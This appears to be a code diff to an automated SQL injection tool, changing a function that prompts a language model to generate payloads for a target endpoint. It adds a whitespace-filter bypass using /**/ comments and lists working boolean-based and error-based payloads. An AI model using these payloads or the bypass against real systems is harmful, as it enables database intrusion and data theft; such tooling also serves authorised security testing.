@@ -279,15 +279,24 @@ def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
     note   = point.get("note", "")
     ctx    = point.get("injection_context", "")
 
+    # note에 공백 제한 여부 감지
+    no_space = "공백" in note or "space" in note.lower()
+    space_rule = (
+        "\nCRITICAL: Spaces are NOT allowed in payloads for this endpoint (server splits on whitespace).\n"
+        "Replace every space with /**/ (SQL inline comment). Example: 'AND/**/ → '/**/AND/**/"
+        "\nCorrect:   '/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,database()))--/**/-"
+        "\nIncorrect: ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"
+    ) if no_space else ""
+
     return f"""Target: SQL Injection via string parameter
 Endpoint: {method} {url}, parameter: {param}
-Injection context: {ctx if ctx else "String value inside single-quoted SQL context: WHERE col = '{input}'"}
-{f"Note: {note}" if note else ""}
+Injection context: {ctx if ctx else "String value inside single-quoted SQL context: WHERE col = '[input]'"}
+{f"Known filter/context behavior: {note}" if note else ""}{space_rule}
 
 Generate {count} SQLi payloads for a string (single-quoted) context.
 Techniques to cover:
 1. Boolean-based blind:
-   ' OR 1=1-- -
+   ' OR 1=1-- -   (no-space version: '/**/OR/**/1=1--/**/-  )
    ' AND 1=2-- -
    ' AND LENGTH(database())>0-- -
 2. Error-based:
